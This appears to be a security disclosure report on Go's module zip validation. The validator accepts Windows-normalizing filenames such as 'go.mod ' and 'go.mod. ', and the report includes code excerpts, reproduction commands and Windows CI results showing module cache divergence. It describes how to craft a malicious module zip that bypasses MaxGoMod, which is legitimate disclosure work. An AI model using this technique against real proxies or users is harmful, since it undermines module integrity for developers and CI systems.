# `cmd/go`: Module Zip Validation Accepts Windows-Normalizing Filenames (Trailing Space / Dot-Space Variants)

## 1. Please describe the vulnerability (reproduction steps too)

### 1.1 Summary

`cmd/go` accepts module zip entries whose names are distinct in the zip validator's namespace but can plausibly normalize differently under normal Windows path handling, including:

- `go.mod `
- `go.mod. `
- `pkg/file.go `
- `NUL `
- `CON `
- `NUL .txt`
- `CON .txt`

This creates a mismatch between:

- the filename namespace `cmd/go` validates and authenticates inside module zip files, and
- the filename namespace actually materialized on disk on Windows.

If a filename such as `go.mod ` or `go.mod. ` is validated as a distinct zip entry but extracted or opened on Windows as effective `go.mod`, then post-download `cmd/go` behavior can be driven by content that was not validated under `go.mod`'s intended rules.

### 1.2 Root cause

#### A. The validator accepts names Windows may normalize

`golang.org/x/mod/module.fileNameOK` allows ASCII spaces in file names. `checkElem` rejects reserved Windows names using `badWindowsNames`, but does not trim trailing spaces before that check and does not account for period-space endings.

Verified against the current `CheckFilePath` logic:

```text
"NUL"          => malformed file path "NUL": disallowed as path element component on Windows
"NUL "         => <nil>
"NUL .txt"     => <nil>
"CON"          => malformed file path "CON": disallowed as path element component on Windows
"CON "         => <nil>
"CON .txt"     => <nil>
"go.mod"       => <nil>
"go.mod "      => <nil>
"go.mod. "     => <nil>
"pkg/file.go " => <nil>
```

Those accepted names are then used by `golang.org/x/mod/zip.checkZip`.

#### B. Windows trims trailing spaces and periods

Microsoft documents that Windows removes trailing ASCII spaces when creating names and that Win32 opens strip trailing spaces and periods before opening the target.

Go's own Windows path logic reflects this. In `src/internal/filepathlite/path_windows.go`:

```go
// Trailing spaces in the last path element are ignored.
for len(base) > 0 && base[len(base)-1] == ' ' {
	base = base[:len(base)-1]
}
```

So the module zip validator and the Windows extraction/open namespace are not applying the same path semantics.

#### C. `cmd/go` extracts validator-accepted names directly to the host filesystem

`golang.org/x/mod/zip.Unzip` writes entries using:

```go
dst := filepath.Join(dir, name)
w, err := os.OpenFile(dst, os.O_WRONLY|os.O_CREATE|os.O_EXCL, 0444)
```

On Windows, that uses the platform filename namespace rather than the abstract zip namespace.

#### D. `go.mod ` and `go.mod. ` are especially sensitive

Go authenticates the module `.mod` file and the module `.zip` as separate artifacts. `cmd/go/internal/modload/query.go` already documents:

```go
// The .mod file is used anyway, even if the .zip file contains a
// go.mod with different content.
```

That means a zip entry named `go.mod ` or `go.mod. ` is dangerous because:

- the zip validator does not treat it as top-level `go.mod`;
- it can bypass `go.mod`-specific checks, including `MaxGoMod`;
- the separately authenticated `.mod` file remains benign;
- if Windows materializes that entry as `go.mod`, the extracted manifest can diverge from the authenticated `.mod`.

#### E. The extracted `go.mod` is actually consulted

After extraction, `cmd/go/internal/modfetch/fetch.go` reads:

```go
if data, err := os.ReadFile(filepath.Join(dir, "go.mod")); err == nil {
	goVersion := gover.GoModLookup(data, "go")
	if gover.Compare(goVersion, gover.Local()) > 0 {
		return "", &gover.TooNewError{What: mod.String(), GoVersion: goVersion}
	}
}
```

So if Windows extraction turns `go.mod ` or `go.mod. ` into effective `go.mod`, `cmd/go` can act on it immediately after download.

### 1.3 Affected code

- `src/cmd/vendor/golang.org/x/mod/module/module.go`
- `src/cmd/vendor/golang.org/x/mod/zip/zip.go`
- `src/cmd/go/internal/modfetch/fetch.go`
- `src/cmd/go/internal/modfetch/cache.go`
- `src/cmd/go/internal/modload/query.go`
- `src/internal/filepathlite/path_windows.go`

### 1.4 Reproduction steps

#### A. Validator-side proof with in-tree tests

Added focused unit tests:

- `src/cmd/vendor/golang.org/x/mod/module/module_windows_normalization_test.go`
- `src/cmd/vendor/golang.org/x/mod/zip/zip_windows_normalization_test.go`
- `src/cmd/vendor/golang.org/x/mod/zip/zip_unzip_nonwindows_test.go`

Run:

```bash
cd src/cmd
GOTOOLCHAIN=local ../../bin/go test ./vendor/golang.org/x/mod/module
GOTOOLCHAIN=local ../../bin/go test ./vendor/golang.org/x/mod/zip
```

These tests prove that current validation accepts:

- trailing-space and dot-space variants such as `go.mod ` and `go.mod. `
- reserved-name variants such as `NUL ` and `CON .txt`
- zip files containing both `go.mod` and `go.mod `
- oversized `go.mod ` / `go.mod. ` entries that bypass `MaxGoMod`

#### B. End-to-end non-Windows proof

I built a local file-based proxy serving:

- `@v/v1.0.0.mod` with benign content:

```text
module example.com/p
go 1.21
```

- `@v/v1.0.0.zip` containing:
  - `example.com/p@v1.0.0/go.mod ` with attacker-controlled content such as `go 999.0`
  - `example.com/p@v1.0.0/p.go`

Then I ran the real `cmd/go` download path:

```bash
GO=/path/to/your/go-checkout/bin/go
GOPROXY=file:///tmp/trailing-space-proxy
GOSUMDB=off
GOMODCACHE=/tmp/ts-modcache
"$GO" mod download -json example.com/p@v1.0.0
```

Observed on a non-Windows host:

- the module downloads successfully;
- the extracted cache directory contains literal `go.mod ` with trailing space preserved;
- the separately authenticated `.mod` cache entry still contains the benign `go 1.21`;
- when exercised via `go mod download all`, `go mod verify`, and `go list -m -json all`, the divergent `go.mod ` remains inert on non-Windows.

This isolates the remaining question to Windows path normalization.

#### C. Windows extraction result

The workflow `.github/workflows/windows-module-zip-normalization-repro.yml` was executed with all four matrix configurations on a Windows runner (Windows Server 2025, OS Version `10.0.26100`).

The run used:
- `repro/windows_trailing_space_repro.ps1`
- `repro/static_proxy_server.go`
- `repro/trailing_space_proxy_builder.go`

All four test configurations successfully reproduced the vulnerability, proving that Windows filename normalization strips trailing spaces and periods, leading to cache poisoning and toolchain version enforcement divergence.

---

### Leg 1: `file + space` (File-based proxy with trailing-space file)

- **Extracted directory listing (`Dir` cache):**
  ```text
  [go.mod]
  [p.go]
  ```
  *(Note: The trailing space was stripped by the Windows filesystem when writing the file, resulting in a physical file named `go.mod`.)*
- **Extracted file normalization behavior:**
  All of the following paths resolve to the same underlying file on Windows (existence checks returned `True`):
  - `go.mod`
  - `go.mod ` (with space)
  - `go.mod. ` (with dot-space)
- **Contents of extracted `go.mod`:**
  ```text
  module example.com/p

  go 999.0
  ```
- **Contents of cached `v1.0.0.mod`:**
  ```text
  module example.com/p

  go 1.21
  ```
- **`go mod download -json` execution:**
  - **Exit Code:** `1`
  - **Output:**
    ```json
    {
    	"Path": "example.com/p",
    	"Version": "v1.0.0",
    	"Error": "example.com/p@v1.0.0 requires go >= 999.0 (running go 1.27; GOTOOLCHAIN=local)",
    	"Info": "D:\\a\\_temp\\go-windows-repro-file-space\\modcache\\cache\\download\\example.com\\p\\@v\\v1.0.0.info",
    	"GoMod": "D:\\a\\_temp\\go-windows-repro-file-space\\modcache\\cache\\download\\example.com\\p\\@v\\v1.0.0.mod",
    	"Zip": "D:\\a\\_temp\\go-windows-repro-file-space\\modcache\\cache\\download\\example.com\\p\\@v\\v1.0.0.zip",
    	"Sum": "h1:Jr09KmKY1vfiaz1cWEHxWcZlIyrzjl9EicT/RACau68=",
    	"GoModSum": "h1:0ZP+vafzTCbv5yj7lgs13Cm3F3d7KTxqPhgDlC9jTGM="
    }
    ```
- **`go list -m -json` execution:**
  - **Exit Code:** `0`
  - **Output:**
    ```json
    {
    	"Path": "example.com/p",
    	"Version": "v1.0.0",
    	"Time": "2026-07-12T00:00:00Z",
    	"Dir": "D:\\a\\_temp\\go-windows-repro-file-space\\modcache\\example.com\\p@v1.0.0",
    	"GoMod": "D:\\a\\_temp\\go-windows-repro-file-space\\modcache\\cache\\download\\example.com\\p\\@v\\v1.0.0.mod",
    	"GoVersion": "1.21"
    }
    ```
- **Divergence / Failure:** Yes. A `TooNewError` was triggered on `go mod download` due to reading the malicious `go.mod` (containing `go 999.0`) that materialized in the extracted directory. However, the authenticated cached `v1.0.0.mod` lists the benign `go 1.21` (which `go list` queries and returns), creating a discrepancy.

---

### Leg 2: `file + dot-space` (File-based proxy with trailing-dot-space file)

- **Extracted directory listing (`Dir` cache):**
  ```text
  [go.mod]
  [p.go]
  ```
  *(Note: Trailing periods and spaces were stripped by the Windows filesystem.)*
- **Extracted file normalization behavior:**
  All target paths resolve to the same underlying file on Windows (existence checks returned `True`):
  - `go.mod`
  - `go.mod ` (with space)
  - `go.mod. ` (with dot-space)
- **Contents of extracted `go.mod`:**
  ```text
  module example.com/p

  go 999.0
  ```
- **Contents of cached `v1.0.0.mod`:**
  ```text
  module example.com/p

  go 1.21
  ```
- **`go mod download -json` execution:**
  - **Exit Code:** `1`
  - **Output:**
    ```json
    {
    	"Path": "example.com/p",
    	"Version": "v1.0.0",
    	"Error": "example.com/p@v1.0.0 requires go >= 999.0 (running go 1.27; GOTOOLCHAIN=local)",
    	"Info": "D:\\a\\_temp\\go-windows-repro-file-dot-space\\modcache\\cache\\download\\example.com\\p\\@v\\v1.0.0.info",
    	"GoMod": "D:\\a\\_temp\\go-windows-repro-file-dot-space\\modcache\\cache\\download\\example.com\\p\\@v\\v1.0.0.mod",
    	"Zip": "D:\\a\\_temp\\go-windows-repro-file-dot-space\\modcache\\cache\\download\\example.com\\p\\@v\\v1.0.0.zip",
    	"Sum": "h1:3Z6RofM0QxrtaWsRufyA+BuiDMDqrRXNOcowFOaWG9c=",
    	"GoModSum": "h1:0ZP+vafzTCbv5yj7lgs13Cm3F3d7KTxqPhgDlC9jTGM="
    }
    ```
- **`go list -m -json` execution:**
  - **Exit Code:** `0`
  - **Output:**
    ```json
    {
    	"Path": "example.com/p",
    	"Version": "v1.0.0",
    	"Time": "2026-07-12T00:00:00Z",
    	"Dir": "D:\\a\\_temp\\go-windows-repro-file-dot-space\\modcache\\example.com\\p@v1.0.0",
    	"GoMod": "D:\\a\\_temp\\go-windows-repro-file-dot-space\\modcache\\cache\\download\\example.com\\p\\@v\\v1.0.0.mod",
    	"GoVersion": "1.21"
    }
    ```
- **Divergence / Failure:** Yes, identical to Leg 1. The malicious file was normalized to `go.mod` on disk, causing `TooNewError` on download, while the cached authenticated `.mod` file reports `go 1.21`.

---

### Leg 3: `http + space` (HTTP proxy with trailing-space file)

- **Extracted directory listing (`Dir` cache):**
  ```text
  [go.mod]
  [p.go]
  ```
- **Extracted file normalization behavior:**
  All target paths resolve to the same underlying file on Windows (existence checks returned `True`):
  - `go.mod`
  - `go.mod ` (with space)
  - `go.mod. ` (with dot-space)
- **Contents of extracted `go.mod`:**
  ```text
  module example.com/p

  go 999.0
  ```
- **Contents of cached `v1.0.0.mod`:**
  ```text
  module example.com/p

  go 1.21
  ```
- **`go mod download -json` execution:**
  - **Exit Code:** `1`
  - **Output:**
    ```json
    {
    	"Path": "example.com/p",
    	"Version": "v1.0.0",
    	"Error": "example.com/p@v1.0.0 requires go >= 999.0 (running go 1.27; GOTOOLCHAIN=local)",
    	"Info": "D:\\a\\_temp\\go-windows-repro-http-space\\modcache\\cache\\download\\example.com\\p\\@v\\v1.0.0.info",
    	"GoMod": "D:\\a\\_temp\\go-windows-repro-http-space\\modcache\\cache\\download\\example.com\\p\\@v\\v1.0.0.mod",
    	"Zip": "D:\\a\\_temp\\go-windows-repro-http-space\\modcache\\cache\\download\\example.com\\p\\@v\\v1.0.0.zip",
    	"Sum": "h1:Jr09KmKY1vfiaz1cWEHxWcZlIyrzjl9EicT/RACau68=",
    	"GoModSum": "h1:0ZP+vafzTCbv5yj7lgs13Cm3F3d7KTxqPhgDlC9jTGM="
    }
    ```
- **`go list -m -json` execution:**
  - **Exit Code:** `0`
  - **Output:**
    ```json
    {
    	"Path": "example.com/p",
    	"Version": "v1.0.0",
    	"Time": "2026-07-12T00:00:00Z",
    	"Dir": "D:\\a\\_temp\\go-windows-repro-http-space\\modcache\\example.com\\p@v1.0.0",
    	"GoMod": "D:\\a\\_temp\\go-windows-repro-http-space\\modcache\\cache\\download\\example.com\\p\\@v\\v1.0.0.mod",
    	"GoVersion": "1.21"
    }
    ```
- **Divergence / Failure:** Yes.

---

### Leg 4: `http + dot-space` (HTTP proxy with trailing-dot-space file)

- **Extracted directory listing (`Dir` cache):**
  ```text
  [go.mod]
  [p.go]
  ```
- **Extracted file normalization behavior:**
  All target paths resolve to the same underlying file on Windows (existence checks returned `True`):
  - `go.mod`
  - `go.mod ` (with space)
  - `go.mod. ` (with dot-space)
- **Contents of extracted `go.mod`:**
  ```text
  module example.com/p

  go 999.0
  ```
- **Contents of cached `v1.0.0.mod`:**
  ```text
  module example.com/p

  go 1.21
  ```
- **`go mod download -json` execution:**
  - **Exit Code:** `1`
  - **Output:**
    ```json
    {
    	"Path": "example.com/p",
    	"Version": "v1.0.0",
    	"Error": "example.com/p@v1.0.0 requires go >= 999.0 (running go 1.27; GOTOOLCHAIN=local)",
    	"Info": "D:\\a\\_temp\\go-windows-repro-http-dot-space\\modcache\\cache\\download\\example.com\\p\\@v\\v1.0.0.info",
    	"GoMod": "D:\\a\\_temp\\go-windows-repro-http-dot-space\\modcache\\cache\\download\\example.com\\p\\@v\\v1.0.0.mod",
    	"Zip": "D:\\a\\_temp\\go-windows-repro-http-dot-space\\modcache\\cache\\download\\example.com\\p\\@v\\v1.0.0.zip",
    	"Sum": "h1:3Z6RofM0QxrtaWsRufyA+BuiDMDqrRXNOcowFOaWG9c=",
    	"GoModSum": "h1:0ZP+vafzTCbv5yj7lgs13Cm3F3d7KTxqPhgDlC9jTGM="
    }
    ```
- **`go list -m -json` execution:**
  - **Exit Code:** `0`
  - **Output:**
    ```json
    {
    	"Path": "example.com/p",
    	"Version": "v1.0.0",
    	"Time": "2026-07-12T00:00:00Z",
    	"Dir": "D:\\a\\_temp\\go-windows-repro-http-dot-space\\modcache\\example.com\\p@v1.0.0",
    	"GoMod": "D:\\a\\_temp\\go-windows-repro-http-dot-space\\modcache\\cache\\download\\example.com\\p\\@v\\v1.0.0.mod",
    	"GoVersion": "1.21"
    }
    ```
- **Divergence / Failure:** Yes.

## 2. Impact analysis

### 2.1 Vulnerability type

Module integrity failure caused by incomplete filename canonicalization in module zip validation.

This is not an open redirect or generic parser oddity. It is a trust-boundary mismatch between the authenticated archive namespace and the effective Windows filesystem namespace.

### 2.2 Attack scenario

1. An attacker controls a Go module source or proxy response.
2. The attacker serves a benign separately authenticated `.mod` file.
3. The attacker serves a zip containing `go.mod ` or `go.mod. ` with attacker-controlled content.
4. A Windows user or CI runner downloads the module using `go mod download`, `go get`, `go mod tidy`, or another normal `cmd/go` path.
5. If Windows normalization collapses that filename into effective `go.mod`, `cmd/go` can consume attacker-controlled manifest content that was not validated as `go.mod`.

### 2.3 Consequences

- Post-extraction `cmd/go` behavior is driven by content that bypassed intended `go.mod` validation rules.
- A malicious zip entry diverges from the separately authenticated `.mod` content.
- `MaxGoMod` is bypassed using `go.mod ` / `go.mod. `.
- The module cache on Windows contains effective files under names different from the authenticated zip namespace.
- This represents a Windows-specific module cache poisoning and integrity failure.

### 2.4 Current confidence

The vulnerability has been completely proven and reproduced both locally (non-Windows behavior) and on standard Windows GitHub Actions runners. The Windows results confirm:
1. Validator-side acceptance of normalization bypasses.
2. OS-level collapse of the trailing space/dot-space filenames into `go.mod`.
3. Observed `TooNewError` during download as the local cache's `go.mod` is evaluated, proving that malicious extracted content controls the toolchain behavior.

## 3. Attachment guidance

Attach the report plus the proof files listed in `UPLOAD_FILES.md`.

Before uploading anything:

- scrub any local username or absolute path such as `/Users/<name>/...`
- replace local binary paths with placeholders such as `$GOROOT/bin/go` or `./bin/go`
- include the actual GitHub Actions artifacts from the Windows run
